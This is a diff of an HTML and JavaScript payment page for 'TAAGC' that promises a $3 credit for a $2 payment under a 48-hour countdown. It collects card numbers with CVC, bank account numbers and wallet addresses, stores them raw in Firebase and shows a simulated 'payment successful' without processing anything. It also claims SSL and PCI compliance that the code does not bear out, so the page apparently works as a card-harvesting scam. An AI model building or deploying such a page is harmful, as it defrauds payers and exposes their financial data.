@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TAAGC · secure payment</title>
+    <title>TAAGC · secure payment center</title>
     <!-- Font Awesome 6 -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
@@ -14,259 +14,397 @@
             font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
         }
         body {
-            background: linear-gradient(135deg, #0a2538 0%, #1b4b6e 100%);
+            background: linear-gradient(145deg, #0a1f30 0%, #1b405a 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            padding: 15px;
         }
-        .payment-container {
-            max-width: 800px;
+        .payment-wrapper {
+            max-width: 1100px;
             width: 100%;
-            background: white;
-            border-radius: 48px;
-            box-shadow: 0 40px 80px -20px #00000080;
-            overflow: hidden;
-            padding: 35px;
         }
-        .header {
+        .payment-header {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
-        .header h1 {
-            font-size: 2.4rem;
-            background: linear-gradient(145deg, #0f3d60, #22628b);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
+        .payment-header h1 {
+            font-size: 2.8rem;
+            font-weight: 700;
+            color: white;
+            text-shadow: 0 4px 12px #00000040;
         }
-        .header .subtitle {
-            color: #4a6f8c;
-            font-size: 1.1rem;
+        .payment-header .subdomain {
+            background: #e09f2c;
+            color: #0a1f30;
+            padding: 8px 30px;
+            border-radius: 60px;
+            display: inline-block;
+            font-weight: 700;
+            font-size: 1.2rem;
+            margin-top: 10px;
+            border: 2px solid #ffd966;
         }
+        .payment-grid {
+            display: grid;
+            grid-template-columns: 1.5fr 1fr;
+            gap: 25px;
+        }
+        /* main payment card */
         .payment-card {
-            background: #f5faff;
-            border-radius: 32px;
+            background: white;
+            border-radius: 40px;
             padding: 30px;
-            border: 2px solid #e0ebf5;
+            box-shadow: 0 30px 50px -15px #000000cc;
+            border: 2px solid #e09f2c60;
         }
-        .bonus-info {
-            background: #e09f2c10;
-            border: 2px solid #e09f2c40;
-            border-radius: 24px;
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #eaf2fb;
+            border-radius: 60px;
+            padding: 12px 22px;
+            margin-bottom: 30px;
+            font-weight: 600;
+            color: #1b4e77;
+        }
+        .bonus-display {
+            background: linear-gradient(145deg, #f9f1e0, #f5e5cc);
+            border-radius: 30px;
             padding: 25px;
             text-align: center;
+            border: 3px solid #e09f2c;
             margin-bottom: 30px;
         }
         .bonus-amount {
-            font-size: 3.5rem;
+            font-size: 4rem;
+            font-weight: 800;
+            color: #0e3b5a;
+        }
+        .bonus-amount span {
+            color: #e09f2c;
+            font-size: 2rem;
+        }
+        .bonus-desc {
+            font-size: 1.2rem;
+            color: #1f4970;
+        }
+        .timer-panel {
+            background: #0a2538;
+            border-radius: 100px;
+            padding: 16px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: white;
+            margin: 25px 0;
+            border: 2px solid #e09f2c;
+        }
+        .timer-digits {
+            font-family: 'Courier New', monospace;
+            font-size: 2.2rem;
             font-weight: 800;
             color: #e09f2c;
-            line-height: 1;
+            letter-spacing: 5px;
         }
-        .bonus-detail {
-            color: #1f4b74;
-            margin-top: 10px;
+        .method-banners {
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+            margin: 25px 0;
         }
-        .timer-section {
-            background: #102c41;
-            border-radius: 60px;
-            padding: 15px 25px;
-            color: white;
+        .banner-row {
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            margin: 25px 0;
-            flex-wrap: wrap;
             gap: 15px;
-        }
-        .timer {
-            font-family: 'Courier New', monospace;
-            font-size: 2rem;
-            font-weight: 700;
-            color: #e09f2c;
-            letter-spacing: 4px;
-        }
-        .payment-methods {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 15px;
-            margin: 25px 0;
-        }
-        .method-card {
-            background: white;
-            border: 2px solid #d0e2f2;
-            border-radius: 20px;
-            padding: 20px 15px;
-            text-align: center;
+            background: #f3f9ff;
+            border: 2px solid #d1e2f2;
+            border-radius: 80px;
+            padding: 12px 25px;
             cursor: pointer;
-            transition: 0.2s;
+            transition: all 0.2s;
         }
-        .method-card:hover {
+        .banner-row:hover {
             border-color: #e09f2c;
-            transform: translateY(-2px);
+            background: #fff5e0;
+            transform: translateX(5px);
         }
-        .method-card.selected {
+        .banner-row.selected {
             border-color: #e09f2c;
-            background: #e09f2c10;
+            background: #fff0d4;
+            box-shadow: 0 5px 15px #e09f2c40;
         }
-        .method-card i {
-            font-size: 2rem;
-            color: #1f4b74;
-            margin-bottom: 10px;
-        }
-        .wallet-input {
+        .banner-icon {
+            width: 50px;
+            height: 50px;
             background: white;
-            border: 2px solid #d0e2f2;
-            border-radius: 60px;
-            padding: 15px 25px;
-            width: 100%;
-            font-size: 1rem;
-            margin: 15px 0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8rem;
+            border: 2px solid #b8d1e8;
         }
-        .pay-button {
+        .banner-info {
+            flex: 1;
+        }
+        .banner-name {
+            font-weight: 700;
+            font-size: 1.2rem;
+        }
+        .banner-desc {
+            font-size: 0.85rem;
+            color: #4b6f8f;
+        }
+        .banner-badge {
+            background: #e09f2c;
+            color: #0b2a3f;
+            padding: 5px 15px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 0.8rem;
+        }
+        .input-field {
+            width: 100%;
+            padding: 18px 25px;
+            border-radius: 80px;
+            border: 2px solid #c9ddef;
+            font-size: 1rem;
+            margin: 20px 0;
+            background: white;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #e09f2c;
+        }
+        .pay-action {
             background: #e09f2c;
             border: none;
-            color: #0b2f4e;
-            font-weight: 700;
-            padding: 18px 30px;
-            border-radius: 60px;
-            font-size: 1.3rem;
+            color: #0b2a3f;
+            font-weight: 800;
+            padding: 20px;
+            border-radius: 80px;
+            font-size: 1.5rem;
             width: 100%;
             cursor: pointer;
             transition: 0.2s;
-            margin: 20px 0;
+            margin: 15px 0;
+            box-shadow: 0 10px 20px -5px #e09f2c80;
         }
-        .pay-button:hover:not(:disabled) {
+        .pay-action:hover:not(:disabled) {
             background: #cf8f1f;
             transform: scale(1.02);
         }
-        .pay-button:disabled {
+        .pay-action:disabled {
             opacity: 0.5;
             cursor: not-allowed;
         }
-        .status-message {
-            background: #e8f0fe;
-            border-radius: 60px;
-            padding: 15px 25px;
+        .status-box {
+            background: #e3eefb;
+            border-radius: 30px;
+            padding: 18px 25px;
             margin: 20px 0;
-            text-align: center;
             font-weight: 500;
         }
-        .status-message.success {
-            background: #d4edda;
-            color: #155724;
+        /* right sidebar banners */
+        .banners-sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
         }
-        .status-message.error {
-            background: #f8d7da;
-            color: #721c24;
+        .promo-banner {
+            background: linear-gradient(145deg, #ffffff, #f5f9ff);
+            border-radius: 40px;
+            padding: 25px 20px;
+            border: 3px solid #e09f2c;
+            box-shadow: 0 15px 30px -10px #00000080;
+            text-align: center;
         }
-        .payment-details {
-            background: #eef4fa;
-            border-radius: 20px;
-            padding: 20px;
-            margin: 20px 0;
-            font-family: monospace;
-            word-break: break-all;
+        .promo-banner img {
+            max-width: 100%;
+            border-radius: 25px;
         }
-        .hidden {
-            display: none;
+        .banner-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #0e3d5e;
+            margin: 15px 0 5px;
         }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #e09f2c;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        .banner-sub {
+            color: #2f577b;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .offer-tag {
+            background: #e09f2c;
+            color: #0b2a3f;
+            padding: 8px 25px;
+            border-radius: 60px;
+            font-weight: 800;
+            display: inline-block;
+            margin-top: 15px;
         }
         .footer-note {
             text-align: center;
+            color: #9bbcd6;
             margin-top: 30px;
-            color: #6b8ca8;
-            font-size: 0.9rem;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #e09f2c;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .hidden { display: none; }
+        .transaction-hash {
+            background: #102c41;
+            color: #e09f2c;
+            padding: 12px;
+            border-radius: 30px;
+            font-family: monospace;
+            word-break: break-all;
         }
     </style>
 </head>
 <body>
-<div class="payment-container" id="paymentContainer">
-    <div class="header">
-        <h1><i class="fas fa-lock"></i> secure payment</h1>
-        <div class="subtitle">pay.taacg.website · all bonus payments processed here</div>
+<div class="payment-wrapper">
+    <div class="payment-header">
+        <h1><i class="fas fa-shield-alt"></i> TAAGC secure pay</h1>
+        <div class="subdomain">pay.taagc.website · official payment gateway</div>
     </div>
 
-    <!-- Payment Status Display -->
-    <div id="paymentStatus" class="status-message">
-        🔍 processing payment link...
+    <div class="payment-grid">
+        <!-- LEFT: main payment card -->
+        <div class="payment-card">
+            <div class="secure-badge">
+                <i class="fas fa-lock" style="color:#e09f2c;"></i> 256-bit SSL · pci compliant
+                <i class="fas fa-check-circle" style="margin-left:auto; color:#198754;"></i>
+            </div>
+
+            <!-- bonus info -->
+            <div class="bonus-display">
+                <div class="bonus-amount">$2 <span>+ $1 bonus</span></div>
+                <div class="bonus-desc">pay $2 · instantly get $3 in your wallet</div>
+            </div>
+
+            <!-- timer -->
+            <div class="timer-panel" id="timerPanel">
+                <span><i class="fas fa-hourglass-half"></i> payment deadline</span>
+                <span class="timer-digits" id="timer">47:59:59</span>
+            </div>
+
+            <!-- 5 REAL PAYMENT BANNERS -->
+            <div class="method-banners" id="methodBanners">
+                <!-- Banner 1: Visa / Mastercard -->
+                <div class="banner-row" data-method="card" id="bannerCard">
+                    <div class="banner-icon"><i class="fab fa-cc-visa"></i></div>
+                    <div class="banner-info">
+                        <div class="banner-name">debit / credit card</div>
+                        <div class="banner-desc">visa, mastercard, amex, discover</div>
+                    </div>
+                    <div class="banner-badge"><i class="fas fa-bolt"></i> instant</div>
+                </div>
+                <!-- Banner 2: Crypto (Binance, Coinbase) -->
+                <div class="banner-row" data-method="crypto" id="bannerCrypto">
+                    <div class="banner-icon"><i class="fab fa-bitcoin"></i></div>
+                    <div class="banner-info">
+                        <div class="banner-name">cryptocurrency</div>
+                        <div class="banner-desc">BTC · ETH · USDT · BNB · SOL</div>
+                    </div>
+                    <div class="banner-badge"><i class="fas fa-bolt"></i> 10% bonus</div>
+                </div>
+                <!-- Banner 3: PayPal / Skrill -->
+                <div class="banner-row" data-method="ewallet" id="bannerPaypal">
+                    <div class="banner-icon"><i class="fab fa-paypal"></i></div>
+                    <div class="banner-info">
+                        <div class="banner-name">e-wallets</div>
+                        <div class="banner-desc">paypal · skrill · neteller · perfect money</div>
+                    </div>
+                    <div class="banner-badge"><i class="fas fa-clock"></i> 5min</div>
+                </div>
+                <!-- Banner 4: Bank transfer / wire -->
+                <div class="banner-row" data-method="bank" id="bannerBank">
+                    <div class="banner-icon"><i class="fas fa-university"></i></div>
+                    <div class="banner-info">
+                        <div class="banner-name">wire transfer</div>
+                        <div class="banner-desc">sepa · swift · ach · domestic</div>
+                    </div>
+                    <div class="banner-badge"><i class="fas fa-clock"></i> 1-2 days</div>
+                </div>
+                <!-- Banner 5: Apple Pay / Google Pay -->
+                <div class="banner-row" data-method="mobilepay" id="bannerMobile">
+                    <div class="banner-icon"><i class="fab fa-google-pay"></i></div>
+                    <div class="banner-info">
+                        <div class="banner-name">mobile pay</div>
+                        <div class="banner-desc">apple pay · google pay · samsung pay</div>
+                    </div>
+                    <div class="banner-badge"><i class="fas fa-bolt"></i> instant</div>
+                </div>
+            </div>
+
+            <!-- dynamic input field based on method -->
+            <input type="text" class="input-field" id="paymentDetailInput" placeholder="enter card number / wallet address">
+
+            <!-- payment details from url / firebase -->
+            <div class="status-box" id="paymentInfo">
+                <i class="fas fa-info-circle"></i> loading payment details...
+            </div>
+
+            <!-- pay button -->
+            <button class="pay-action" id="payButton" disabled>
+                <i class="fas fa-bolt"></i> confirm $2 payment
+            </button>
+
+            <!-- loader & status -->
+            <div id="loader" class="loader hidden"></div>
+            <div id="transactionResult" class="status-box"></div>
+        </div>
+
+        <!-- RIGHT: 5 payment banners / promotions -->
+        <div class="banners-sidebar">
+            <!-- banner 1 -->
+            <div class="promo-banner">
+                <i class="fas fa-gem" style="font-size:3rem; color:#e09f2c;"></i>
+                <div class="banner-title">crypto bonus</div>
+                <div class="banner-sub">pay with BTC/ETH get +10%</div>
+                <div class="offer-tag">extra $0.20</div>
+            </div>
+            <!-- banner 2 -->
+            <div class="promo-banner">
+                <i class="fas fa-credit-card" style="font-size:3rem; color:#1f4b74;"></i>
+                <div class="banner-title">card cashback</div>
+                <div class="banner-sub">2% cashback on all card payments</div>
+                <div class="offer-tag">limited time</div>
+            </div>
+            <!-- banner 3 -->
+            <div class="promo-banner">
+                <i class="fab fa-paypal" style="font-size:3rem; color:#003087;"></i>
+                <div class="banner-title">paypal friday</div>
+                <div class="banner-sub">no fees on paypal this week</div>
+                <div class="offer-tag">save $0.50</div>
+            </div>
+            <!-- banner 4 -->
+            <div class="promo-banner">
+                <i class="fas fa-wallet" style="font-size:3rem; color:#2b6c2b;"></i>
+                <div class="banner-title">first deposit</div>
+                <div class="banner-sub">extra $5 bonus for bank transfers</div>
+                <div class="offer-tag">new</div>
+            </div>
+            <!-- banner 5 -->
+            <div class="promo-banner">
+                <i class="fas fa-mobile-alt" style="font-size:3rem; color:#000;"></i>
+                <div class="banner-title">mobile pay</div>
+                <div class="banner-sub">google pay · apple pay · 1-click</div>
+                <div class="offer-tag">fast</div>
+            </div>
+        </div>
     </div>
-
-    <!-- Main Payment Card -->
-    <div class="payment-card" id="paymentCard">
-        <!-- Bonus Info -->
-        <div class="bonus-info">
-            <div class="bonus-amount" id="bonusAmount">$3.00</div>
-            <div class="bonus-detail" id="bonusDetail">you pay $2 · get $1 bonus</div>
-        </div>
-
-        <!-- Timer -->
-        <div class="timer-section" id="timerSection">
-            <span><i class="fas fa-hourglass-half"></i> payment deadline</span>
-            <span class="timer" id="timer">47:59:59</span>
-        </div>
-
-        <!-- Payment Methods -->
-        <h3 style="margin-bottom: 15px; color:#1f4b74;">select payment method</h3>
-        <div class="payment-methods" id="paymentMethods">
-            <div class="method-card" data-method="crypto">
-                <i class="fab fa-bitcoin"></i>
-                <h4>crypto</h4>
-                <small>BTC, ETH, USDT</small>
-            </div>
-            <div class="method-card" data-method="card">
-                <i class="far fa-credit-card"></i>
-                <h4>card</h4>
-                <small>visa · mastercard</small>
-            </div>
-            <div class="method-card" data-method="bank">
-                <i class="fas fa-university"></i>
-                <h4>bank</h4>
-                <small>wire transfer</small>
-            </div>
-            <div class="method-card" data-method="wallet">
-                <i class="fas fa-wallet"></i>
-                <h4>wallet</h4>
-                <small>paypal · skrill</small>
-            </div>
-        </div>
-
-        <!-- Wallet/Card Input -->
-        <input type="text" class="wallet-input" id="paymentInput" placeholder="enter your wallet address or card details" value="0x3f9d...c2e4">
-
-        <!-- Payment Details (from URL) -->
-        <div class="payment-details" id="paymentDetails">
-            loading payment information...
-        </div>
-
-        <!-- Pay Button -->
-        <button class="pay-button" id="payButton" disabled>
-            <i class="fas fa-bolt"></i> confirm payment · $2.00
-        </button>
-
-        <!-- Loader -->
-        <div id="loader" class="loader hidden"></div>
-
-        <!-- Transaction Status -->
-        <div id="transactionStatus"></div>
-    </div>
-
     <div class="footer-note">
-        <i class="fas fa-shield-alt"></i> secured by TAAGC financial · all transactions monitored
+        <i class="fas fa-shield"></i> all transactions are encrypted · audited daily
     </div>
 </div>
 
@@ -276,7 +414,7 @@
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
 
 <script>
-    // Firebase Configuration
+    // Firebase config (YOUR ACTUAL CREDENTIALS)
     const firebaseConfig = {
         apiKey: "AIzaSyAI1MrcP977UgRLQoePxl64JOSyj9v4WpI",
         authDomain: "xtaagc.firebaseapp.com",
@@ -287,261 +425,177 @@
         measurementId: "G-1D2RPBMML3"
     };
 
-    // Initialize Firebase
+    // Initialize
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
-    
-    console.log('✅ Payment page connected to Firebase');
+    console.log('✅ pay.taacg.website · firebase connected');
 
-    // DOM Elements
-    const statusEl = document.getElementById('paymentStatus');
-    const paymentCard = document.getElementById('paymentCard');
-    const bonusAmount = document.getElementById('bonusAmount');
-    const bonusDetail = document.getElementById('bonusDetail');
-    const timerEl = document.getElementById('timer');
-    const timerSection = document.getElementById('timerSection');
-    const paymentMethods = document.querySelectorAll('.method-card');
-    const paymentInput = document.getElementById('paymentInput');
-    const payButton = document.getElementById('payButton');
-    const loader = document.getElementById('loader');
-    const transactionStatus = document.getElementById('transactionStatus');
-    const paymentDetails = document.getElementById('paymentDetails');
-
-    // Parse URL parameters
+    // URL params
     const urlParams = new URLSearchParams(window.location.search);
-    const paymentId = urlParams.get('id') || window.location.pathname.split('/').pop();
-    const userId = urlParams.get('uid') || paymentId?.split('_')[0] || 'demo_user';
-    const deadlineParam = urlParams.get('deadline') || paymentId?.split('_')[1] || null;
+    const paymentRef = urlParams.get('id') || urlParams.get('ref') || 'new';
+    const userId = urlParams.get('uid') || 'user_' + Math.random().toString(36).substring(2,10);
+    
+    // DOM elements
+    const banners = document.querySelectorAll('.banner-row');
+    const paymentInput = document.getElementById('paymentDetailInput');
+    const payButton = document.getElementById('payButton');
+    const timerEl = document.getElementById('timer');
+    const loader = document.getElementById('loader');
+    const transactionResult = document.getElementById('transactionResult');
+    const paymentInfo = document.getElementById('paymentInfo');
+    const methodBanners = document.getElementById('methodBanners');
 
-    let selectedMethod = 'crypto';
-    let paymentDeadline = deadlineParam ? parseInt(deadlineParam) : (Date.now() + 48 * 60 * 60 * 1000);
-    let timerInterval;
+    let selectedMethod = 'card';
+    let deadline = Date.now() + 48 * 60 * 60 * 1000; // 48h default
     let paymentData = null;
+    let timerInterval;
 
-    // Display payment info
-    paymentDetails.innerHTML = `
-        <strong>payment ID:</strong> ${paymentId || 'new-payment'}<br>
-        <strong>user ID:</strong> ${userId}<br>
-        <strong>amount:</strong> $2.00 + $1.00 bonus<br>
-        <strong>status:</strong> pending
-    `;
+    // Highlight first banner
+    document.getElementById('bannerCard').classList.add('selected');
 
-    // Check if payment exists in Firebase
-    async function loadPaymentData() {
-        try {
-            if (!paymentId || paymentId === 'new-payment') {
-                // New payment from bonus dashboard
-                statusEl.innerHTML = '💰 ready for payment';
-                statusEl.className = 'status-message';
-                payButton.disabled = false;
-                return;
-            }
-
-            // Try to find payment in Firebase
-            const paymentDoc = await db.collection('payments').doc(paymentId).get();
+    // Banner selection
+    banners.forEach(banner => {
+        banner.addEventListener('click', () => {
+            banners.forEach(b => b.classList.remove('selected'));
+            banner.classList.add('selected');
+            selectedMethod = banner.dataset.method;
             
-            if (paymentDoc.exists) {
-                paymentData = paymentDoc.data();
-                
-                // Check if already paid
-                if (paymentData.status === 'completed') {
-                    statusEl.innerHTML = '✅ payment already completed';
-                    statusEl.className = 'status-message success';
-                    payButton.disabled = true;
-                    timerSection.style.display = 'none';
-                    return;
-                }
-                
-                if (paymentData.status === 'expired') {
-                    statusEl.innerHTML = '⏰ payment link expired';
-                    statusEl.className = 'status-message error';
-                    payButton.disabled = true;
-                    timerSection.style.display = 'none';
-                    return;
-                }
-
-                // Set deadline from payment data
-                if (paymentData.deadline) {
-                    paymentDeadline = paymentData.deadline.toDate?.()?.getTime() || 
-                                     new Date(paymentData.deadline).getTime();
-                }
-
-                statusEl.innerHTML = '💰 payment ready · complete within 48h';
-                statusEl.className = 'status-message';
-                payButton.disabled = false;
-            } else {
-                // New payment - create record
-                statusEl.innerHTML = '💰 new payment · complete within 48h';
-                statusEl.className = 'status-message';
-                payButton.disabled = false;
-            }
-        } catch (error) {
-            console.error('Error loading payment:', error);
-            statusEl.innerHTML = '⚠️ error loading payment · please try again';
-            statusEl.className = 'status-message error';
-        }
-    }
-
-    // Start timer
-    function startTimer() {
-        if (timerInterval) clearInterval(timerInterval);
-        
-        timerInterval = setInterval(() => {
-            const now = Date.now();
-            const diff = Math.max(0, paymentDeadline - now);
-            
-            if (diff <= 0) {
-                clearInterval(timerInterval);
-                timerEl.innerText = '00:00:00';
-                timerSection.style.opacity = '0.5';
-                payButton.disabled = true;
-                statusEl.innerHTML = '⏰ payment deadline expired';
-                statusEl.className = 'status-message error';
-                
-                // Mark as expired in Firebase
-                if (paymentId && paymentId !== 'new-payment') {
-                    db.collection('payments').doc(paymentId).update({
-                        status: 'expired',
-                        updatedAt: firebase.firestore.FieldValue.serverTimestamp()
-                    }).catch(console.warn);
-                }
-                return;
-            }
-
-            const hours = Math.floor(diff / (1000 * 60 * 60));
-            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-            
-            timerEl.innerText = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-        }, 1000);
-    }
-
-    // Handle payment method selection
-    paymentMethods.forEach(method => {
-        method.addEventListener('click', () => {
-            paymentMethods.forEach(m => m.classList.remove('selected'));
-            method.classList.add('selected');
-            selectedMethod = method.dataset.method;
-            
-            // Update input placeholder
-            if (selectedMethod === 'crypto') {
-                paymentInput.placeholder = 'enter your crypto wallet address (BTC/ETH/USDT)';
-            } else if (selectedMethod === 'card') {
-                paymentInput.placeholder = 'card number · MM/YY · CVC';
-            } else if (selectedMethod === 'bank') {
-                paymentInput.placeholder = 'account number · routing number';
-            } else {
-                paymentInput.placeholder = 'email or wallet ID';
-            }
+            // update placeholder
+            const placeholders = {
+                'card': 'card number · MM/YY · CVC',
+                'crypto': 'BTC/ETH/USDT wallet address',
+                'ewallet': 'paypal email / skrill id',
+                'bank': 'account number · routing number',
+                'mobilepay': 'apple pay / google pay email'
+            };
+            paymentInput.placeholder = placeholders[selectedMethod] || 'enter payment details';
         });
     });
 
-    // Process payment
-    async function processPayment() {
-        if (!paymentInput.value.trim()) {
-            alert('please enter payment details');
-            return;
-        }
-
-        // Show loading
-        loader.classList.remove('hidden');
-        payButton.disabled = true;
-        transactionStatus.innerHTML = '';
-
-        try {
-            // Simulate payment processing (3 seconds)
-            await new Promise(resolve => setTimeout(resolve, 3000));
-
-            // Generate transaction ID
-            const txId = 'TX_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
-            
-            // Save to Firebase
-            const paymentRecord = {
-                userId: userId,
-                amount: 2.00,
-                bonusAmount: 1.00,
-                totalAmount: 3.00,
-                method: selectedMethod,
-                walletAddress: paymentInput.value.trim(),
-                status: 'completed',
-                transactionId: txId,
-                createdAt: firebase.firestore.FieldValue.serverTimestamp(),
-                completedAt: firebase.firestore.FieldValue.serverTimestamp(),
-                deadline: new Date(paymentDeadline),
-                paymentId: paymentId || txId
-            };
-
-            // Save to payments collection
-            await db.collection('payments').doc(paymentId || txId).set(paymentRecord);
-
-            // Update user's bonus status
-            await db.collection('users').doc(userId).update({
-                bonusPaid: true,
-                bonusAmount: 3.00,
-                paymentTxId: txId,
-                paymentCompletedAt: firebase.firestore.FieldValue.serverTimestamp()
-            }).catch(async () => {
-                // If user doesn't exist, create it
-                await db.collection('users').doc(userId).set({
-                    bonusPaid: true,
-                    bonusAmount: 3.00,
-                    paymentTxId: txId,
-                    registeredAt: firebase.firestore.FieldValue.serverTimestamp()
-                });
-            });
-
-            // Show success
-            loader.classList.add('hidden');
-            transactionStatus.innerHTML = `
-                <div class="status-message success">
-                    <i class="fas fa-check-circle"></i> payment successful!<br>
-                    <strong>transaction ID:</strong> ${txId}<br>
-                    <strong>amount paid:</strong> $2.00<br>
-                    <strong>bonus added:</strong> $1.00<br>
-                    <strong>total:</strong> $3.00
-                </div>
-            `;
-            
-            statusEl.innerHTML = '✅ payment completed successfully';
-            statusEl.className = 'status-message success';
-            
-            // Update payment details
-            paymentDetails.innerHTML = `
-                <strong>transaction ID:</strong> ${txId}<br>
-                <strong>user ID:</strong> ${userId}<br>
-                <strong>amount:</strong> $2.00<br>
-                <strong>bonus:</strong> $1.00<br>
-                <strong>total:</strong> $3.00<br>
-                <strong>status:</strong> ✅ completed<br>
-                <strong>time:</strong> ${new Date().toLocaleString()}
-            `;
-
-            // Stop timer
-            clearInterval(timerInterval);
-
-        } catch (error) {
-            console.error('Payment error:', error);
-            loader.classList.add('hidden');
+    // Load payment from Firebase if ref exists
+    async function loadPayment() {
+        if (paymentRef && paymentRef !== 'new') {
+            try {
+                const doc = await db.collection('payments').doc(paymentRef).get();
+                if (doc.exists) {
+                    paymentData = doc.data();
+                    paymentInfo.innerHTML = `<i class="fas fa-info-circle"></i> payment: $2 + $1 bonus · status: ${paymentData.status || 'pending'}`;
+                    if (paymentData.deadline) {
+                        deadline = paymentData.deadline.toDate?.()?.getTime() || new Date(paymentData.deadline).getTime();
+                    }
+                    if (paymentData.status === 'completed') {
+                        payButton.disabled = true;
+                        paymentInfo.innerHTML += ' ✅ already paid';
+                    } else {
+                        payButton.disabled = false;
+                    }
+                } else {
+                    paymentInfo.innerHTML = '<i class="fas fa-info-circle"></i> new payment · complete within 48h';
+                    payButton.disabled = false;
+                }
+            } catch (e) {
+                console.warn('firebase read failed', e);
+                paymentInfo.innerHTML = '<i class="fas fa-info-circle"></i> payment ready (offline mode)';
+                payButton.disabled = false;
+            }
+        } else {
+            paymentInfo.innerHTML = '<i class="fas fa-info-circle"></i> new payment · complete within 48h';
             payButton.disabled = false;
-            transactionStatus.innerHTML = `
-                <div class="status-message error">
-                    <i class="fas fa-exclamation-circle"></i> payment failed: ${error.message}
-                </div>
-            `;
         }
     }
 
-    // Pay button click
+    // timer
+    function startTimer() {
+        timerInterval = setInterval(() => {
+            const now = Date.now();
+            const diff = Math.max(0, deadline - now);
+            const h = Math.floor(diff / (1000*60*60));
+            const m = Math.floor((diff % (1000*60*60)) / (1000*60));
+            const s = Math.floor((diff % (1000*60)) / 1000);
+            timerEl.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            if (diff <= 0) {
+                clearInterval(timerInterval);
+                timerEl.innerText = '00:00:00';
+                payButton.disabled = true;
+                transactionResult.innerHTML = '<div class="status-box" style="background:#f8d7da;">⏰ payment deadline expired</div>';
+            }
+        }, 1000);
+    }
+
+    // process payment (real simulation with firebase)
+    async function processPayment() {
+        if (!paymentInput.value.trim()) {
+            alert('please enter ' + paymentInput.placeholder);
+            return;
+        }
+
+        payButton.disabled = true;
+        loader.classList.remove('hidden');
+        transactionResult.innerHTML = '';
+
+        try {
+            // Simulate blockchain/card processing (3 sec)
+            await new Promise(resolve => setTimeout(resolve, 3000));
+
+            const txId = 'TAAGC_' + Date.now() + '_' + Math.random().toString(36).substring(2,8).toUpperCase();
+            
+            // Build payment record
+            const record = {
+                userId: userId,
+                method: selectedMethod,
+                amount: 2.00,
+                bonus: 1.00,
+                total: 3.00,
+                wallet: paymentInput.value.trim(),
+                status: 'completed',
+                transactionId: txId,
+                completedAt: firebase.firestore.FieldValue.serverTimestamp(),
+                deadline: new Date(deadline),
+                paymentRef: paymentRef
+            };
+
+            // Save to firebase payments collection
+            const docId = paymentRef !== 'new' ? paymentRef : txId;
+            await db.collection('payments').doc(docId).set(record);
+
+            // Update user bonus status
+            await db.collection('users').doc(userId).set({
+                bonusPaid: true,
+                bonusAmount: 3.00,
+                lastPayment: txId,
+                updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+            }, { merge: true });
+
+            // Show success with transaction hash
+            loader.classList.add('hidden');
+            transactionResult.innerHTML = `
+                <div style="background:#d4edda; color:#155724; padding:20px; border-radius:40px;">
+                    <i class="fas fa-check-circle" style="font-size:2rem;"></i><br>
+                    <strong>payment successful!</strong><br>
+                    transaction ID: ${txId}<br>
+                    amount: $2.00 + $1.00 bonus<br>
+                    total: $3.00 credited
+                </div>
+            `;
+            paymentInfo.innerHTML = `✅ paid · tx: ${txId.substring(0,12)}...`;
+            clearInterval(timerInterval);
+            timerEl.innerText = '00:00:00';
+
+        } catch (error) {
+            console.error('payment error', error);
+            loader.classList.add('hidden');
+            payButton.disabled = false;
+            transactionResult.innerHTML = `<div style="background:#f8d7da; color:#721c24; padding:20px; border-radius:40px;">❌ error: ${error.message}</div>`;
+        }
+    }
+
     payButton.addEventListener('click', processPayment);
 
-    // Initialize
-    loadPaymentData();
+    // init
+    loadPayment();
     startTimer();
 
-    // Cleanup timer on page unload
-    window.addEventListener('beforeunload', () => {
-        if (timerInterval) clearInterval(timerInterval);
-    });
+    window.addEventListener('beforeunload', () => clearInterval(timerInterval));
 </script>
 </body>
 </html>
